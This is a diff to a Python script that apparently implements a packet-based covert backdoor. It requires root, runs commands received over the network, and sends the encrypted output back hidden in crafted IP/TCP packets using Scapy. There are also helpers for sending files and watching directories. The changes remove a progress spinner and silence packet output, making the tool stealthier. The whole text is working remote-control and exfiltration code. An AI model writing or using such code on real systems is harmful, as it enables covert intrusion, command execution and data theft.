@@ -15,7 +15,6 @@ from multiprocessing import Process
 
 CONN_IPS = collections.defaultdict(list)
 CMDS = collections.defaultdict(list)
-MONITOR = 0
 MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
 INIT_VALUE = "JohnCenaTheChamp"
 
@@ -50,12 +49,6 @@ def verify_root():
 		exit("This program must be run with root/sudo")
 
 
-def spinning_cursor():
-	while True:
-		for cursor in '|/-\\':
-			yield cursor
-
-
 def file_to_binary(file, path):
 	f = open(path, "rb")
 	header = file + '\0'
@@ -87,21 +80,17 @@ def send_end_msg(dest, output_type, sport):
 	elif(output_type == "write"):
 		type_id = 41414
 	packet = IP(dst=dest, id=type_id) / TCP(dport=randPort, sport=sport)
-	send(packet)
+	send(packet, verbose=0)
 
 
 def send_data(msg, ip, sport, output_type):
 	msg = encrypt_val(msg)
 	for char1, char2 in zip(msg[0::2], msg[1::2]):
 		# delay_sleep()
-		sys.stdout.write(spinner.next())
-		sys.stdout.flush()
-		time.sleep(0.1)
-		sys.stdout.write('\b')
-		send(data_packet(ip, sport, char1, char2))
+		send(data_packet(ip, sport, char1, char2), verbose=0)
 	if(len(msg) % 2):
 		# delay_sleep()
-		send(data_packet(ip, sport, msg[-1]))
+		send(data_packet(ip, sport, msg[-1]), verbose=0)
 	send_end_msg(ip, output_type, sport)
 
 
@@ -113,10 +102,10 @@ def run_cmd(packet, cmd):
 		arguments = arguments.rstrip('\0')
 	except ValueError:
 		command = cmd.rstrip('\0')
-		arguments = None
-	print("Running command: {} {}".format(command, arguments))
+		arguments = ""
+	print("Running command: {} {}...".format(command, arguments))
 	try:
-		if(arguments is not None):
+		if(arguments is not ""):
 			out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
 		else:
 			out, err = Popen(command, stdout=PIPE, stderr=PIPE).communicate()
@@ -129,6 +118,7 @@ def run_cmd(packet, cmd):
 	# output = encrypt_val("".join(output))
 	time.sleep(0.1)
 	send_data(''.join(output), packet[1].src, packet[2].sport, "print")
+	print("Finished")
 
 
 def watch_dir(packet, path):
